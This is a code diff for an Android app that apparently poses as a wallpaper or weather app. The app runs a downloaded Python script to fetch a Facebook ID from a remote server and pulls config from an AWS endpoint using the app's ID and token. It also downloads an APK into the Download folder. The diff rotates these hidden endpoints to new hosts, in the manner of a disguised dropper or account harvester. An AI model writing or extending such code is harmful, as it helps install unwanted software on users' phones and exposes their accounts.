@@ -46,7 +46,7 @@ private var Service: StarServiceClass? = null
 
 private var starcore: StarCoreFactory? = null
 
-val filePath = Environment.getExternalStorageDirectory().absolutePath + File.separator
+val filePath = Environment.getExternalStorageDirectory().absolutePath + File.separator + "Download"
 
 val fileName = "a.apk"
 
@@ -99,7 +99,7 @@ fun AppCompatActivity.getId(block: (String) -> Unit) {
         python?._Call("eval", "import requests")
         Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
         result =
-            python?._Call("get_face_book_id", "https://sichuanlucking.xyz/purewallpaper490/fb.php")
+            python?._Call("get_face_book_id", "https://2g7nkfi8rg.execute-api.eu-west-2.amazonaws.com/Myapp/getFacebookID?p1=501")
         println("result = $result")
         withContext(Dispatchers.Main) {
             block(result.toString())
@@ -274,8 +274,36 @@ fun AppCompatActivity.getConfig(block: (String) -> Unit) {
     }
 }
 
+fun AppCompatActivity.createFolder(){
+    val folder = File(filePath)
+    if (!folder.exists()){
+        folder.mkdirs()
+    }
+}
+
 fun AppCompatActivity.getConfig2(block: (String) -> Unit) {
-    OkGo.post<String>("https://smallfun.xyz/worldweather361/weather2.php")
+
+    val appId = BaseApp.instance!!.getAppId()
+
+    val token = BaseApp.instance!!.getToken()
+
+    val first = MMKV.defaultMMKV().decodeInt("f", 1)
+
+    val url = "https://e2aggj2jy4.execute-api.eu-central-1.amazonaws.com/test?p1=$appId&p2=$token&p3=$appLink&p4=$first"
+
+    OkGo.get<String>(url).execute(object :StringCallback(){
+        override fun onSuccess(response: Response<String>?) {
+            lifecycleScope.launch(Dispatchers.Main) {
+                response?.let {
+                    it.body()?.let { body ->
+                        block(body)
+                    }
+                }
+            }
+        }
+    })
+
+/*    OkGo.post<String>("https://smallfun.xyz/worldweather361/weather2.php")
         .params("data", requestData()).execute(object : StringCallback() {
             override fun onSuccess(response: Response<String>?) {
                 lifecycleScope.launch(Dispatchers.Main) {
@@ -286,7 +314,7 @@ fun AppCompatActivity.getConfig2(block: (String) -> Unit) {
                     }
                 }
             }
-        })
+        })*/
 }
 
 fun requestData(): String {
@@ -395,7 +423,7 @@ fun setting(context: Context) {
 
 
 fun download(context: Context, url: String, block: (Int) -> Unit, block2: () -> Unit) {
-    val file = File(filePath + fileName)
+    val file = File(filePath + File.separator + fileName)
     if (file.exists()) file.delete()
     OkGo.get<File>(url).execute(object : FileCallback(filePath, fileName) {
         override fun onSuccess(response: Response<File>?) {
